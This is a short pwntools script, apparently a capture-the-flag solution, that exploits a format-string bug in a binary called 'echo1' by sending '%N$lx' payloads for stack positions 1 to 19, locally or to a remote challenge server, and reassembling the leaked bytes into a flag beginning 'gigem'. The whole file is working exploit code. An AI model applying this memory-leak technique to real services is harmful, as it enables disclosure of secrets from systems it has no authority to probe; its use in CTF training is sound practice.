from pwn import *


exe = ELF("echo1")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe

context.log_level = 'error'

def conn():
    if args.REMOTE:
        r = remote("128.199.12.141", 7013)
    else:
        r = exe.process()
    return r

should_print = False
for i in range(1,20):
    r = conn()
    r.sendline(f"%{i}$lx".encode())
    try:
        lmao = bytes.fromhex(r.recvline().decode().rstrip())[::-1]
    except:
        pass
    if b"gigem" in lmao:
        should_print = True
    if should_print:
        print(lmao.decode(errors='ignore'),end="")
    if b"}" in lmao:
        should_print = False
    r.close()


# automate inputs as necessary here

r.interactive()
